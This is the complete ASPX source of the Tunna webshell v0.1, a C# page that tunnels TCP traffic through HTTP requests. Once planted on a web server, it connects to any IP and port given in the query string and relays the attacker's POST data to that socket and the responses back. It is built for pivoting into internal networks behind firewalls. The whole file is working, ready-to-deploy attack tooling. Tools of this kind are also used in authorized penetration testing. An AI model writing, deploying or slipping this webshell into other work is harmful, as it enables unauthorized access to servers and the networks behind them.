<%@ Page Language="C#" Debug="true" ENABLESESSIONSTATE = true  ValidateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
//
//Tunna ASPX webshell v0.1 (c) 2013 by Nikos Vassakis
//http://www.secforce.com / nikos.vassakis <at> secforce.com
//
protected System.Web.UI.HtmlControls.HtmlInputFile File1;	
protected Socket connect(){	//Create and connect to socket
	Socket socket;
	IPHostEntry ipHostInfo;
	IPAddress ipAddress;	
	IPEndPoint remoteEP;
	string ip;
	int port;
	
	try{				//Initialise values 
		ip = (string) Session["ip"];
		port = (int) Session["port"];
		}
	catch{
		HttpContext.Current.Response.Write("[Server] Missing Arguments");
		throw;
		}
	try{
		ipHostInfo = Dns.GetHostByAddress(ip); //Dns.GetHostByName
		ipAddress = ipHostInfo.AddressList[0];
		if (ipAddress==null){ throw new Exception("Wrong IP"); }
		remoteEP = new IPEndPoint(ipAddress, port);

		socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 2000); //NOTE:20 second timeout
		}
	catch{
		HttpContext.Current.Response.Write(Session["ip"]);
		HttpContext.Current.Response.Write("[Server] Unable to resolve IP");
		throw;
		}
		
	try{	//Connect to socket
		socket.Connect(remoteEP);
		}
	catch(Exception){
		HttpContext.Current.Response.Write("[Server] Unable to connect to socket");
		throw;
		}
	try{	//Socket in non-blocking mode because of the consecutive HTTP requests
		socket.Blocking = false;
		}
	catch(Exception){
		HttpContext.Current.Response.Write("[Server] Unable to set socket to non blocking mode");
		throw;
		}
	return socket;
}
protected void Page_Load(object sender, EventArgs e){
HttpContext.Current.Server.ScriptTimeout = 600;		//NOTE: randomly chose 600
int port;
string ip;
if (Request.Url.Query.StartsWith("?proxy")){				//XXX:Stupid hack but works
	if (Request.Url.Query.StartsWith("?proxy&close")){		//If url var close receive: close socket / invalidate session / Kill thread
		Session["running"] = -1;	
		Socket socket = Session["socket"] as Socket;
		if (socket != null){
			socket.Close();
			}
		Session.Abandon();
		Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId",""));
		Response.Write("[Server] Killing the handler thread");
		return;
		}
	if(Request.QueryString["port"] != null){	//if port is specified connects to that port
		Session["port"] = Convert.ToInt32(Request.QueryString["port"]);
		}
	if(Request.QueryString["ip"] != null){	//if ip is specified connects to that ip
		Session["ip"] = Request.QueryString["ip"];
		}
	else{
		Session["ip"] = "127.0.0.1";
		}

	if(Session["running"] == null){				//1st request: initiate the session
		Session["running"] = 0;
		Response.Write("[Server] All good to go, ensure the listener is working ;-)");
		}
	else{
		if ((int)Session["running"] == 0){		//2nd request: get configuration options
			try{
				Session["socket"] = connect();
				Session["running"] = 1;
				Response.Write("[OK]");			//Send [OK] back
				return;
				}
			catch(Exception){
				return;
				}
			}
		else{									
			Socket socket = Session["socket"] as Socket;
			
			//Read data from request and write to socket
			byte[] postData = Request.BinaryRead(Request.TotalBytes);
			if (postData.Length > 0){
				try{
					socket.Send(postData);
					}
				catch(Exception){
					HttpContext.Current.Response.Write("[Server] Local socket closed");
				}
			}
			//Read Data from socket and write to response
			byte[] receiveBuffer = new byte[8192];
			try{
				int bytesRead = socket.Receive(receiveBuffer);
				if (bytesRead > 0) {
					//Welcome to C trim
					byte[] received = new byte[bytesRead];
					Array.Copy(receiveBuffer, received , bytesRead);
					
					Response.BinaryWrite(received);
					}
				else {
					HttpContext.Current.Response.Write("");	//No data on socket: send nothing back
					}
				}
			catch(Exception){
				HttpContext.Current.Response.Write("");
				}
			}
		}
	}
}
</script>

